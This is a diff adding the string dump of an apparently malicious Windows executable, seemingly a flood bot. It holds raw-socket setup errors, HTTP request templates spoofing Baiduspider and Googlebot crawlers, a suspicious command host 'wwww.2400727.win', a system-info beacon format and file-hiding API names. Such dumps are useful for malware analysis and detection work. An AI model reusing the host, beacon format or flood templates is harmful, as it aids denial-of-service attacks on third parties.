@@ -1,0 +1,258 @@
+!This program cannot be run in DOS mode.
+Rich!
+.data
+Eliminate small Japanese
+wwww.2400727.win
+%d.%d.%d.%d
+Set IP_HDRINCL Error!
+WSASocket() failed: %d
+WSAStartup failed: %d
+GET %s HTTP/1.1
+%c%c%c%c%c%c%c%c.%s
+%c%c%c%c%c%c%c%c%s
+GET %s HTTP/1.1
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*
+Accept-Language: zh-cn
+Accept-Encoding: gzip, deflate
+User-Agent:Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)
+Host: %s:%d
+Connection: Keep-Alive
+GET %s HTTP/1.1
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*
+Accept-Language: zh-cn
+Accept-Encoding: gzip, deflate
+User-Agent:Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)
+Host: %s
+Connection: Keep-Alive
+GET %s HTTP/1.1
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*
+Accept-Language: zh-cn
+Accept-Encoding: gzip, deflate
+User-Agent:Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+Host: %s:%d
+Connection: Keep-Alive
+POST %s HTTP/1.1
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*
+Accept-Language: zh-cn
+Accept-Encoding: gzip, deflate
+User-Agent:Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+Host: %s
+Connection: Keep-Alive
+GET %s HTTP/1.1
+Host: %s:%d
+GET %s HTTP/1.1
+Host: %s
+InternetCloseHandle
+InternetReadFile
+InternetOpenUrlA
+MSIE 6.0
+InternetOpenA
+wininet.dll
+WinSta0\Default
+\??\%s\%c%c%s
+\??\%s\%s
+%s\%s
+SHELL32.dll
+SHGetSpecialFolderPathA
+GetFileAttributesA
+USER32.dll
+CreateDirectoryA
+SetFileAttributesA
+MoveFileExA
+KERNEL32.dll
+DefineDosDeviceA
+kernel32.DLL
+GetModuleFileNameA
+~MHz
+HARDWARE\DESCRIPTION\System\CentralProcessor\0
+XXOOXXOO:%s|%d|%d|%s
+Windows NT
+Windows 10
+Windows 8
+Windows 2012
+2012
+Windows 7
+Windows Server 2008
+2008
+Windows Vista
+Vista
+Windows Server 2003
+2003
+Windows XP
+Windows Server 2000
+2000
+ProductName
+SOFTWARE\Microsoft\Windows NT\CurrentVersion
+h9h7(
+BRh<
+9h7(V
+XXXX
+|$,P
+T$,f
+XXXX
+_^][
+_^][
+_^][
+_^][
+_^][
+h9h7(
+BRh<
+9h7(V
+XXXX
+|$,P
+T$,f
+XXXX
+_^][
+_^][
+_^][
+_^][
+_^][
+SUVW3
+WWWWh4
+|$$t&h 
+_^]2
+|$(h
+T$(Q
+|$(MZu'
+T$ SR
+L$0PQR
+|$$j
+_^][
+t$`W
+FtgVS
+QRPPPPPPVP
+D$L\
+t$\W
+QRPPPPPPSP
+D$DD
+D$tf
+D$&p
+D$'r
+D$(i
+D$)n
+D$*t
+D$+f
+D$,A
+L$xj
+D$xPh|
+D$ f
+D$!u
+D$"c
+D$#k
+D$$3
+D$%6
+T$<jd
+D$@\
+D$A\
+D$B.
+D$C\
+D$Df
+D$Eu
+D$Fc
+D$Gk
+D$H3
+D$I6
+T$tj
+T$0j
+T$DU
+_^][
+D$(j
+_^][
+_^][
+_^][
+_^][
+_^][
+_^][
+_^][
+_^][
+_^][
+Vh@!@
+_^][
+Vh "@
+_^][
+Vh $@
+_^][
+Vh &@
+_^][
+Vh '@
+_^][
+Vh`#@
+_^][
+Vh (@
+_^][
+D$"9
+D$)8
+D$*e
+D$+7
+D$xQ
+L$|h8
+SUj<Q
+Qh +@
+][_^
+SUVWPh
+h 6@
+D$xQ
+L$|h8
+SUj<Q
+h +@
+][_^
+hp:@
+hSVW
+h`A@
+>"u:F
+XPVSS
+GetTickCount
+GetCurrentProcessId
+ExitThread
+Sleep
+CloseHandle
+WriteFile
+CreateFileA
+FreeLibrary
+GetProcAddress
+LoadLibraryA
+GetLastError
+GetFileAttributesA
+CreateProcessA
+CreateThread
+GetSystemInfo
+WaitForSingleObject
+GetModuleHandleA
+KERNEL32.dll
+wsprintfA
+MessageBoxA
+USER32.dll
+RegCloseKey
+RegQueryValueExA
+RegOpenKeyA
+RegOpenKeyExA
+ADVAPI32.dll
+WSASocketA
+WSAIoctl
+WS2_32.dll
+rand
+sprintf
+printf
+fprintf
+_except_handler3
+_local_unwind2
+??3@YAXPAX@Z
+strrchr
+??2@YAPAXI@Z
+strstr
+MSVCRT.dll
+_iob
+_exit
+_XcptFilter
+exit
+_acmdln
+__getmainargs
+_initterm
+__setusermatherr
+_adjust_fdiv
+__p__commode
+__p__fmode
+__set_app_type
+_controlfp
+iphlpapi.dll
+GetStartupInfoA
